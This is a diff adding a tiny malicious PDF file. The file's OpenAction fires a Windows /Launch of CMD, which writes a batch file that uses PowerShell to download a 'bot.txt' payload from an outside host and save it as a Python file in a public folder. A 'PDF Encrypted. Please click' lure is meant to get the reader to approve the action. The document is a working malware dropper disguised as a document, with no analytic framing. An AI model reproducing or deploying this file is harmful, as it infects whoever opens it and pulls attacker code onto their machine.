@@ -1,0 +1,17 @@
+%PDF-1.1
+:
+1 0 obj
+<< /Pages 1 0 R /OpenAction 2 0 R>>
+endobj
+2 0 obj
+ <<
+			/S /Launch/Win 
+
+		    <<			
+			/F (CMD) /P (/c cD  %tEMP% &@echo powershell -Command "(New-Object Net.WebClient).DownloadFile('https://idl-s.com/bot.txt', 'C:\\Users\\Public\\Document\\libb1.py')" >> msd89h2j389uh.bat 
+			
+			                    PDF Encrypted. Please click)
+			>>
+		 
+		>>
+endobj
